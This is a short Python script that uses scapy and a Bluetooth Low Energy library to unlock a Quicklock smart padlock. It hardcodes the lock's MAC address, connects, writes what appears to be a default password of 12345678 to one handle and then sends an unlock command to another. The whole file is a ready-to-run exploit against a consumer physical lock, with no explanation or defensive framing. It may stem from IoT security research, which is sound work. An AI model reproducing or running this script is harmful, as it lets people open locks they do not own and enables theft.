#!/bin/python

# Unlock Quicklock Padlock using scapy
# Quicklock 	C4:BE:84:02:76:3B
# Host 		98:58:8A:05:09:45

import time
from scapy.all import *
from BTLE import *

def main():
	s = bindsock()
	rand = "00"
	Connect(s, "3B760284BEC4",rand)

	writereq(s, "2d00","001234567800000000")
	writereq(s, "3700","01")
	time.sleep(5)
	disconnect(s)

if __name__ == "__main__":
    main()
